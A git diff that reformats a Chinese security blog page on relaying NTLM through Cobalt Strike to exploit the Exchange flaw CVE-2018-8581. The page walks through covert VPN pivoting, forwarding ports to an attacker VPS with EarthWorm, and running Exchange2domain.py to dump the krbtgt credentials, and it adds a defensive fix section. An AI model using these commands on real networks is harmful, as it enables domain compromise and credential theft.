@@ -1,4 +1,21 @@
-<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -68,7 +85,7 @@
     back2top_sidebar: false,
     fancybox: true,
     fastclick: true,
-    lazyload: true,
+    lazyload: false,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     algolia: {
@@ -91,22 +108,22 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="Remote NTLM relaying through CS">
 <meta property="og:url" content="https://evi1cg.github.io/archives/Remote_NTLM_relaying_through_CS.html">
-<meta property="og:site_name" content="Evi1cg's blog">
+<meta property="og:site_name" content="Evi1cg&#39;s blog">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2019/15485575598334.jpg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2019/15485584490614.jpg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2019/15485595933128.jpg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2019/15485609930800.jpg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2019/15485610686816.jpg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2019/15485611318865.jpg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2019/15485612387475.jpg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2019/15485613085983.jpg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2019/15486510674349.jpg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2019/15486518696316.jpg">
 <meta property="og:updated_time" content="2019-01-28T05:07:17.762Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Remote NTLM relaying through CS">
-<meta name="twitter:image" content="https://evi1cg.github.io/images/loading.svg">
+<meta name="twitter:image" content="https://evi1cg.github.io/usr/uploads/2019/15485575598334.jpg">
 
 
 
@@ -486,31 +503,31 @@
       
 
       
-        <meta name="generator" content="Hexo 3.9.0"><p> </p><div class="progress-images" style="width:2878px"><div class="progress-images--placeholder" style="padding-bottom: 52.466990965948575%;"></div><img src="/images/loading.svg" alt="-w944" class="progress-images--original" data-original="/usr/uploads/2019/15485575598334.jpg" data-thumb="/images/thumb/34a306105836a3bcc6f64c4794bed718.jpg"></div><p></p>
+        <p> <img src="/usr/uploads/2019/15485575598334.jpg" alt="-w944"></p>
 <a id="more"></a>
 <h2 id="0x00-为什么写这个？"><a href="#0x00-为什么写这个？" class="headerlink" title="0x00 为什么写这个？"></a>0x00 为什么写这个？</h2><p>最近在学习Exchange在提权中的应用的时候，碰到一个问题，即：如果我们现在拥有了一个内网的windows主机，如何利用这台主机使用<a href="https://evi1cg.me/archives/Exchange_Privilege_Elevation.html" target="_blank" rel="noopener">CVE_2018_8581</a> ？大概的结构是这样：</p>
-<p> </p><div class="progress-images" style="width:1888px"><div class="progress-images--placeholder" style="padding-bottom: 56.779661016949156%;"></div><img src="/images/loading.svg" alt="-w944" class="progress-images--original" data-original="/usr/uploads/2019/15485584490614.jpg" data-thumb="/images/thumb/89b1a8d09884b0d862e25f4a19edda78.jpg"></div><p></p>
+<p> <img src="/usr/uploads/2019/15485584490614.jpg" alt="-w944"></p>
 <blockquote>
 <p>攻击者通过某种方式获取一台域内主机权限。并获取了此主机的域成员账号密码，在获取DC及Exchange Server的ip地址后，利用CVE_2018_8581</p>
 </blockquote>
 <h2 id="0x01-利用思路"><a href="#0x01-利用思路" class="headerlink" title="0x01 利用思路"></a>0x01 利用思路</h2><h3 id="思路一：编译py版的impacket"><a href="#思路一：编译py版的impacket" class="headerlink" title="思路一：编译py版的impacket"></a>思路一：编译py版的impacket</h3><p>在做这个的时候，第一想法就是有没有windows下可用的impacket，后来找了找，还真有<a href="https://github.com/ropnop/impacket_static_binaries" target="_blank" rel="noopener">impacket_static_binaries</a>，于是就拿来用了。但是后来发现是有问题的。<br><del>首先，利用需要关闭win的445端口，这个就需要重启，这是我们非常不愿意做的，另外，似乎</del>win版的<code>ntlmrelayx</code> 和 <code>smbrelayx</code>还不能用。</p>
-<p></p><div class="progress-images" style="width:1864px"><div class="progress-images--placeholder" style="padding-bottom: 12.660944206008583%;"></div><img src="/images/loading.svg" alt="-w932" class="progress-images--original" data-original="/usr/uploads/2019/15485595933128.jpg" data-thumb="/images/thumb/379586e7ddf19c73e0d78bb510d76483.jpg"></div><p></p>
+<p><img src="/usr/uploads/2019/15485595933128.jpg" alt="-w932"></p>
 <p>所以直接放弃了。</p>
 <h3 id="思路二：通过meterpreter进行NTLM-relaying"><a href="#思路二：通过meterpreter进行NTLM-relaying" class="headerlink" title="思路二：通过meterpreter进行NTLM relaying"></a>思路二：通过meterpreter进行NTLM relaying</h3><p>这个思路是之前看到的<a href="https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/" target="_blank" rel="noopener">《Remote NTLM relaying through meterpreter on Windows port 445》</a>来的。在这篇文章里面，详细分析了是谁占用了445，如何进行转发再进行Remote NTLM relaying。利用<code>CVE_2018_8581</code>，我们需要<del>两个端口，<code>445</code>和</del><code>80</code>(80可以是其他端口，用来开启HTTP服务)，但是实际测试的时候，并不顺利，成功添加路由，开启端口转发，开启 socks4a 之后，本地通过proxychains开启一个web server，在内网其他主机请求这个server的时候，并未看到任何请求（可能是姿势不对，成功的师傅还望不吝赐教）。所以通过此方式，也并没达到我期望的效果。</p>
 <h3 id="思路三：通过CS部署VPN"><a href="#思路三：通过CS部署VPN" class="headerlink" title="思路三：通过CS部署VPN"></a>思路三：通过CS部署VPN</h3><p>这个也是我觉得最简单的一种方式，在上面两种思路失败之后，就只能期待试用这种方式来进行了，还好，成功啦~</p>
 <p>Cobaltstrike 的covertvpn的介绍，可以看<a href="https://www.cobaltstrike.com/help-covert-vpn" target="_blank" rel="noopener">这里</a>。</p>
-<p>在获取到一个Becon之后,右键连接->Pivoting->Deploy VPN</p>
-<p></p><div class="progress-images" style="width:1498px"><div class="progress-images--placeholder" style="padding-bottom: 62.483311081441926%;"></div><img src="/images/loading.svg" alt="-w749" class="progress-images--original" data-original="/usr/uploads/2019/15485609930800.jpg" data-thumb="/images/thumb/395a7125112440ffbec3ba6dfd3422a3.jpg"></div><p></p>
+<p>在获取到一个Becon之后,右键连接-&gt;Pivoting-&gt;Deploy VPN</p>
+<p><img src="/usr/uploads/2019/15485609930800.jpg" alt="-w749"></p>
 <p>之后，选择对应的内网ip</p>
-<p></p><div class="progress-images" style="width:960px"><div class="progress-images--placeholder" style="padding-bottom: 50%;"></div><img src="/images/loading.svg" alt="-w480" class="progress-images--original" data-original="/usr/uploads/2019/15485610686816.jpg" data-thumb="/images/thumb/363d7d81d4f37a8eba23cb6d4f65788a.jpg"></div><p></p>
+<p><img src="/usr/uploads/2019/15485610686816.jpg" alt="-w480"></p>
 <p>点击ADD来添加本地网口：</p>
-<p></p><div class="progress-images" style="width:784px"><div class="progress-images--placeholder" style="padding-bottom: 72.1938775510204%;"></div><img src="/images/loading.svg" alt="-w392" class="progress-images--original" data-original="/usr/uploads/2019/15485611318865.jpg" data-thumb="/images/thumb/80f39f15d9012a69693e79ca49f3de8e.jpg"></div><p></p>
+<p><img src="/usr/uploads/2019/15485611318865.jpg" alt="-w392"></p>
 <p>在这里有多种方式的隧道，可以根据自己的需要选择，默认UDP是开销最小的一种方式。添加以后，点击Deploy则可部署成功。</p>
-<p></p><div class="progress-images" style="width:960px"><div class="progress-images--placeholder" style="padding-bottom: 50%;"></div><img src="/images/loading.svg" alt="-w480" class="progress-images--original" data-original="/usr/uploads/2019/15485612387475.jpg" data-thumb="/images/thumb/37e1180d50924200aa4040fe50a81fb4.jpg"></div><p></p>
+<p><img src="/usr/uploads/2019/15485612387475.jpg" alt="-w480"></p>
 <p>之后，在<code>Interfaces</code>中可以看到对应信息：</p>
-<p></p><div class="progress-images" style="width:1496px"><div class="progress-images--placeholder" style="padding-bottom: 32.0855614973262%;"></div><img src="/images/loading.svg" alt="-w748" class="progress-images--original" data-original="/usr/uploads/2019/15485613085983.jpg" data-thumb="/images/thumb/c7ada16fe8d9eaa9012a43394af9693b.jpg"></div><p></p>
-<p>之后我们在VPS上配置此网口：<br></p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig<span class="built_in"> Interface </span>CIDR</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>example:<br></p><figure class="highlight lsl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig phear5 <span class="number">10.211</span><span class="number">.55</span><span class="number">.225</span>/<span class="number">24</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<p><img src="/usr/uploads/2019/15485613085983.jpg" alt="-w748"></p>
+<p>之后我们在VPS上配置此网口：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig<span class="built_in"> Interface </span>CIDR</span><br></pre></td></tr></table></figure></p>
+<p>example:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig phear5 <span class="number">10.211</span><span class="number">.55</span><span class="number">.225</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>前面的ip地址就是要给我们的网口配置的ip地址，相当于在域里面新接入了一台主机</p>
 </blockquote>
@@ -521,33 +538,33 @@
 <p>Tips：部署VPN只需要普通用户权限即可。但是获取当前用户账号密码需要提权。</p>
 </blockquote>
 <h2 id="0x02-如何防御-CVE-2018-8581"><a href="#0x02-如何防御-CVE-2018-8581" class="headerlink" title="0x02 如何防御 CVE_2018_8581"></a>0x02 如何防御 CVE_2018_8581</h2><p>删除域内某用户的<code>DCSync</code>权限，可使用 <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">PowerView</a>。</p>
-<p>具体命令为：<br></p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-DomainObjectAcl -TargetIdentity <span class="string">"DC=cgdomain,DC=com"</span> -PrincipalIdentity<span class="built_in"> user </span>-Rights DCSync</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>具体命令为：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-DomainObjectAcl -TargetIdentity <span class="string">"DC=cgdomain,DC=com"</span> -PrincipalIdentity<span class="built_in"> user </span>-Rights DCSync</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>根据自己的实际环境进行修改</p>
 </blockquote>
 <p>修复Exchage权限，可使用 <a href="https://raw.githubusercontent.com/gdedrouas/Exchange-AD-Privesc/master/DomainObject/Fix-DomainObjectDACL.ps1" target="_blank" rel="noopener">Fix-DomainObjectDACL.ps1</a></p>
 <p>具体命令为：</p>
-<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\Fix-DomainObjectDACL<span class="selector-class">.ps1</span> -Fix</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\Fix-DomainObjectDACL<span class="selector-class">.ps1</span> -Fix</span><br></pre></td></tr></table></figure>
 <h2 id="0x03-进一步测试"><a href="#0x03-进一步测试" class="headerlink" title="0x03 进一步测试"></a>0x03 进一步测试</h2><p>经过进一步测试以及对漏洞的原理再次学习，发现其实我们只需要开启一个web服务即可，所以，可以使用任意端口(在impacket中，HTTPRelayServer默认端口为80，<a href="https://github.com/Ridter/Exchange2domain" target="_blank" rel="noopener">Exchange2domain</a>已支持自定义端口)。</p>
 <p>当然，上述 <strong>思路三</strong> 对smbrelay也是非常好用的一种方式。现在补充一下 <strong>思路二</strong> 的具体利用方法。</p>
-<p>由于我们不需要smb Server，所以也不需要向<a href="https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/" target="_blank" rel="noopener">《Remote NTLM relaying through meterpreter on Windows port 445》</a>中所述对445端口进行转发，我们只需要将web端口转发出来即可。在获取一个meterpreter会话之后，添加路由:<br></p><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter > <span class="keyword">run</span><span class="bash"> post/multi/manage/autoroute</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>由于我们不需要smb Server，所以也不需要向<a href="https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/" target="_blank" rel="noopener">《Remote NTLM relaying through meterpreter on Windows port 445》</a>中所述对445端口进行转发，我们只需要将web端口转发出来即可。在获取一个meterpreter会话之后，添加路由:<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="keyword">run</span><span class="bash"> post/multi/manage/autoroute</span></span><br></pre></td></tr></table></figure></p>
 <p>之后开启<code>socks4a</code>代理。</p>
-<p></p><div class="progress-images" style="width:2012px"><div class="progress-images--placeholder" style="padding-bottom: 62.22664015904572%;"></div><img src="/images/loading.svg" alt="-w1006" class="progress-images--original" data-original="/usr/uploads/2019/15486510674349.jpg" data-thumb="/images/thumb/8303cf81e57c7b91d759fd4c31006c4d.jpg"></div><p></p>
-<p>经过测试，发现msf的<code>portfwd</code>不怎么稳定，所以我选择了使用<a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener"><code>ew</code></a>，当然，也可以使用lcx等其他转发工具。<br>在vps上开启转发：<br></p><figure class="highlight lsl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">☁  lcx  ./ew -s lcx_tran -l <span class="number">8088</span> -f <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -g <span class="number">8044</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<p><img src="/usr/uploads/2019/15486510674349.jpg" alt="-w1006"></p>
+<p>经过测试，发现msf的<code>portfwd</code>不怎么稳定，所以我选择了使用<a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener"><code>ew</code></a>，当然，也可以使用lcx等其他转发工具。<br>在vps上开启转发：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">☁  lcx  ./ew -s lcx_tran -l <span class="number">8088</span> -f <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -g <span class="number">8044</span></span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>监听本地8088端口，并将数据转发到127.0.0.1的8044端口</p>
 </blockquote>
-<p>然后在我们有权限的主机上执行：<br></p><figure class="highlight taggerscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\s</span>anfeng<span class="symbol">\D</span>esktop>ew_for_Win.exe -s lcx_tran -l 8044 -f 103.*.*.* -g 8088</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>然后在我们有权限的主机上执行：<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\s</span>anfeng<span class="symbol">\D</span>esktop&gt;ew_for_Win.exe -s lcx_tran -l 8044 -f 103.*.*.* -g 8088</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>监听本地8044端口的数据，并将数据转发到103.<em>.</em>.*的8080端口。<code>需要注意的是，有权限的主机监听端口=vps转发端口=Exchange2domain监听端口</code></p>
 </blockquote>
-<p>之后，在vps上配置proxychains，ubuntu上proxychains的配置文件路径为<code>/etc/proxychains.conf</code>。修改代理配置文件，如下：<br></p><figure class="highlight vala"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"><span class="meta"># add proxy here ...</span></span><br><span class="line"><span class="meta"># meanwile</span></span><br><span class="line"><span class="meta"># defaults set to "tor"</span></span><br><span class="line">socks4  <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1080</span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>之后，我们就可一执行Exchange2domain了：<br></p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python Exchange2domain.py -ah proxyip -ap 8044 -u<span class="built_in"> user </span>-p password -d domain -th DCIP ExchangeIP --just-dc-user krbtgt</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>之后，在vps上配置proxychains，ubuntu上proxychains的配置文件路径为<code>/etc/proxychains.conf</code>。修改代理配置文件，如下：<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"><span class="meta"># add proxy here ...</span></span><br><span class="line"><span class="meta"># meanwile</span></span><br><span class="line"><span class="meta"># defaults set to "tor"</span></span><br><span class="line">socks4  <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1080</span></span><br></pre></td></tr></table></figure></p>
+<p>之后，我们就可一执行Exchange2domain了：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python Exchange2domain.py -ah proxyip -ap 8044 -u<span class="built_in"> user </span>-p password -d domain -th DCIP ExchangeIP --just-dc-user krbtgt</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>注意监听端口跟上面一致，proxyip为我们有权限的主机的ip地址。</p>
 </blockquote>
 <p>所以，整个攻击过程如下：</p>
-<p></p><div class="progress-images" style="width:2880px"><div class="progress-images--placeholder" style="padding-bottom: 62.5%;"></div><img src="/images/loading.svg" alt="-w1440" class="progress-images--original" data-original="/usr/uploads/2019/15486518696316.jpg" data-thumb="/images/thumb/3969544a279d9c7f286730a50dbedc87.jpg"></div><p></p>
+<p><img src="/usr/uploads/2019/15486518696316.jpg" alt="-w1440"></p>
 <p><strong>希望以上对你有帮助。</strong></p>
 <h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ol>
 <li><a href="https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/" target="_blank" rel="noopener">Remote NTLM relaying through meterpreter on Windows port 445</a></li>
@@ -909,7 +926,7 @@
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -920,7 +937,7 @@
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -931,7 +948,7 @@
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -942,7 +959,7 @@
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -994,7 +1011,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -1056,8 +1073,6 @@
 
 
 
-  
-
 
 
 
@@ -1086,9 +1101,6 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/fastclick@1/lib/fastclick.min.js"></script>
-
-  
-  <script src="//cdn.jsdelivr.net/npm/jquery-lazyload@1/jquery.lazyload.min.js"></script>
 
   
   <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
@@ -1532,11 +1544,6 @@
   
 
   
-  
-  
-  <script src="/lib/pangu/dist/pangu.min.js?v=3.3"></script>
-  <script>pangu.spacingPage();</script>
-
 
   
 
@@ -1676,6 +1683,5 @@
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
-
-<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
+</html>
